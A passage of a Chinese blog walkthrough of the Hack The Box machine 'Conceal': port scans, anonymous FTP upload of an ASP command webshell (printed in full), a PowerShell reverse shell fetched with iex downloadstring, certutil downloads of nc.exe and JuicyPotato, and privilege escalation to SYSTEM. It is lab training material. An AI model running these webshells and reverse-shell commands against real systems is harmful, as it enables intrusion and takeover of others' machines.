+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.14.12.png" alt="截屏2021-10-17 上午4.14.12"><br>安装完成后再次启动成功连接到VPN<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.09.41.png" alt="截屏2021-10-17 上午4.09.41"></p>
+<h3 id="端口探测-1"><a href="#端口探测-1" class="headerlink" title="端口探测"></a>端口探测</h3><p>连上IPsec VPN后我们需要再次使用nmap对其进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p- -sV -sC --open --min-rate 10000 -oA nmap_Conceal_vpn 10.10.10.116</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.25.49.png" alt="截屏2021-10-17 上午4.25.49"><br>通过扫描结果可以发现目标开放了21、80、125、139以及445端口</p>
+<h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p>访问后发现这是IIS的默认界面<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.23.24.png" alt="截屏2021-10-17 上午4.23.24"><br>使用 gobuster 进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.116 -w /usr/share/wordlists/dirb/big.txt -x asp,aspx</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.56.07.png" alt="截屏2021-10-17 上午4.56.07"><br>访问<code>http://10.10.10.116/upload/</code>，没有发现什么东西<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.56.42.png" alt="截屏2021-10-17 上午4.56.42"></p>
+<h4 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h4><p>访问 ftp 端口发现能够通过匿名登录漏洞进入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.10.116</span><br><span class="line"><span class="comment">## 账号密码：anonymous/anonymous</span></span><br><span class="line">ftp &gt; ls</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.27.52.png" alt="截屏2021-10-17 上午4.27.52"><br>但是在其中不存在文件或目录</p>
+<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>尝试在ftp目录下上传webshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp &gt; put /usr/share/webshells/aspx/cmdasp.aspx cmdasp.aspx</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.03.47.png" alt="截屏2021-10-17 上午5.03.47"><br>在 upload 目录中出现 cmdasp.aspx，说明通过ftp可以直接将文件上传至网页端<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.03.56.png" alt="截屏2021-10-17 上午5.03.56"><br>访问出现404，于是上传另一个asp木马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp &gt; put /usr/share/webshells/asp/cmdasp.asp cmdasp.asp</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.09.48.png" alt="截屏2021-10-17 上午5.09.48"><br>访问还是存在问题，但是上传下面这个简单的木马就能够成功执行，可能是因为服务端对执行函数进行了检查</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">ASP Webshell</span></span><br><span class="line"><span class="comment">Working on latest IIS </span></span><br><span class="line"><span class="comment">Referance :- </span></span><br><span class="line"><span class="comment">https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp</span></span><br><span class="line"><span class="comment">http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script</span></span><br><span class="line"><span class="comment">http://www.w3schools.com/asp/</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">Set oScript = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)</span><br><span class="line">Set oScriptNet = Server.CreateObject(&quot;WSCRIPT.NETWORK&quot;)</span><br><span class="line">Set oFileSys = Server.CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">Function getCommandOutput(theCommand)</span><br><span class="line">    Dim objShell, objCmdExec</span><br><span class="line">    Set objShell = CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">    Set objCmdExec = objshell.exec(thecommand)</span><br><span class="line">    getCommandOutput = objCmdExec.StdOut.ReadAll</span><br><span class="line">end Function</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FORM</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;cmd&quot;</span> <span class="attr">size</span>=<span class="string">45</span> <span class="attr">value</span>=<span class="string">&quot;&lt;%= szCMD %&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FORM</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PRE</span>&gt;</span></span><br><span class="line">&lt;%= &quot;\\&quot; &amp; oScriptNet.ComputerName &amp; &quot;\&quot; &amp; oScriptNet.UserName %&gt;</span><br><span class="line">&lt;%Response.Write(Request.ServerVariables(&quot;server_name&quot;))%&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>The server&#x27;s port:<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">&lt;%Response.Write(Request.ServerVariables(&quot;server_port&quot;))%&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>The server&#x27;s software:<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">&lt;%Response.Write(Request.ServerVariables(&quot;server_software&quot;))%&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>The server&#x27;s software:<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">&lt;%Response.Write(Request.ServerVariables(&quot;LOCAL_ADDR&quot;))%&gt;</span><br><span class="line">&lt;% szCMD = request(&quot;cmd&quot;)</span><br><span class="line">thisDir = getCommandOutput(&quot;cmd /c&quot; &amp; szCMD)</span><br><span class="line">Response.Write(thisDir)%&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.16.56.png" alt="截屏2021-10-17 上午5.16.56"><br>虽然能够成功上传木马，但是目标每隔2分钟会自动删除其中文件，我们需要通过反弹shell建立稳定的连接</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>使用 nishang 的脚本<code>Invoke-PowerShellTcp.ps1</code>建立反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ~/Desktop/nishang/Shells/Invoke-PowerShellTcp.ps1 .</span><br></pre></td></tr></table></figure>
+<p>在脚本最后添加反弹地址和端口并上传</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Invoke-PowerShellTcp</span> <span class="string">-Reverse</span> <span class="string">-IPAddress</span> <span class="number">10.10</span><span class="number">.14</span><span class="number">.2</span> <span class="string">-Port</span> <span class="number">5555</span></span><br></pre></td></tr></table></figure>
+<p>使用 python 开启http服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+<p>在本地开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555</span><br></pre></td></tr></table></figure>
+<p>访问<code>http://10.10.10.116/upload/shell.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.2/Invoke-PowerShellTcp.ps1%27)</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.24.06.png" alt="截屏2021-10-17 上午5.24.06"><br>成功反弹shell</p>
+<h2 id="0x03-权限提升-system"><a href="#0x03-权限提升-system" class="headerlink" title="0x03 权限提升[system]"></a>0x03 权限提升[system]</h2><h3 id="查询内核漏洞"><a href="#查询内核漏洞" class="headerlink" title="查询内核漏洞"></a>查询内核漏洞</h3><p>查看系统信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.26.45.png" alt="截屏2021-10-17 上午5.26.45"><br>发现目标 Windows 10 且未安装补丁，使用 Windows-Exploit-Suggester 查找相关漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python windows-exploit-suggester.py --database 2021-05-18-mssb.xls  --systeminfo systeminfo.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.28.22.png" alt="截屏2021-10-17 上午5.28.22"></p>
+<h3 id="尝试烂土豆提权"><a href="#尝试烂土豆提权" class="headerlink" title="尝试烂土豆提权"></a>尝试烂土豆提权</h3><p>在扫描结果中存在许多提权方式，选择 Juicy Potato 进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /root/hackthebox/Machines/Bounty/JuicyPotato.exe .</span><br><span class="line">cp /root/hackthebox/Machines/Bounty/nc.exe .</span><br></pre></td></tr></table></figure>
+<p>在本地开启nc监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+<p>在shell中执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -f http://10.10.14.2/JuicyPotato.exe C:\WINDOWS\TEMP\JuicyPotato.exe</span><br><span class="line">certutil.exe -urlcache -f http://10.10.14.2/nc.exe C:\WINDOWS\TEMP\nc.exe</span><br><span class="line">C:\WINDOWS\TEMP\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a <span class="string">&quot;/c C:\WINDOWS\TEMP\nc.exe -e cmd.exe 10.10.14.2 4444&quot;</span> -t *</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.35.34.png" alt="截屏2021-10-17 上午5.35.34"><br>但是执行失败，查看原因后发现原来当前用户没有权限进入<code>C:\WINODWS\TEMP</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.36.53.png" alt="截屏2021-10-17 上午5.36.53"><br>那就先在当前用户桌面上找找第一个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\Destitute\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\Destitute\Desktop\proof.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.42.05.png" alt="截屏2021-10-17 上午5.42.05"><br>成功获取第一个flag</p>
+<h3 id="烂土豆提权"><a href="#烂土豆提权" class="headerlink" title="烂土豆提权"></a>烂土豆提权</h3><p>由于我们无法进入<code>C:\WINODWS\TEMP</code>，我们需要在当前用户的 temp 目录下上传文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:\Users\Destitute\appdata\<span class="built_in">local</span>\temp</span><br><span class="line">certutil.exe -urlcache -f http://10.10.14.2/JuicyPotato.exe JuicyPotato.exe</span><br><span class="line">certutil.exe -urlcache -f http://10.10.14.2/nc.exe nc.exe</span><br></pre></td></tr></table></figure>
+<p>在本地开启nc监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 6666</span><br></pre></td></tr></table></figure>
+<p>通过上传的nc反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\nc.exe -e cmd.exe 10.10.14.2 6666</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.53.07.png" alt="截屏2021-10-17 上午5.53.07"><br>成功拿到当前用户temp目录下的shell，在将执行代码写入 rev.bat 中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> C:\users\Destitute\appdata\<span class="built_in">local</span>\temp\nc.exe -e cmd.exe 10.10.14.2 4444 &gt; rev.bat</span><br></pre></td></tr></table></figure>
+<p>执行命令通过 nc 反弹将提权后系统用户反弹到本地</p>
+<blockquote>
+<p>其中 windows 10 enterprise 版的 wuauserv 的 CLSID 为 {e60687f7-01a1-40aa-86ac-db1cbf673334}，可在烂土豆项目中进行查询</p>
+</blockquote>
+<p><strong>参考地址：<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise">https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise</a></strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -p C:\users\Destitute\appdata\<span class="built_in">local</span>\temp\rev.bat -l 1340 -t * -c &#123;e60687f7-01a1-40aa-86ac-db1cbf673334&#125;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.54.57.png" alt="截屏2021-10-17 上午5.54.57"><br>成功获取到系统权限<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.55.10.png" alt="截屏2021-10-17 上午5.55.10"><br>在管理员桌面上寻找第二个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\Administrator\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\Administrator\Desktop\proof.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.59.28.png" alt="截屏2021-10-17 上午5.59.28"><br>成功获取第二个flag</p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/5c402ce9/">HTB: Jerry<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
